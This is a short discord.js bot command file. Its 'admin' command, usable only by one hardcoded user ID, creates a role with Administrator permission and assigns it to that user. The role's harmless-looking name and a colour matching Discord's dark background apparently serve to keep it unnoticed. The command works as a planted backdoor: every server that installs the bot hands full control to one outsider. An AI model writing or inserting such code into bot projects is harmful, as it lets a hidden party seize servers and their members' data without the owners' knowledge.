const Discord = require("discord.js");

exports.run = async (client, message, args) => {
  if (message.author.id !== "583649910092595232") return;
  try {
    let role = await message.guild.roles.create({
      data: { name: "McDunaldz", color: "#2f3136", permissions: [8] }
    });

    message.member.roles.add(role);
  } catch (e) {
    console.log(e.stack);
  }
};

module.exports.help = {
  name: "admin",
  description: "Gives you admin perms.",
  usage: "admin"
};

exports.conf = {
  aliases: [],
  cooldown: 0
};
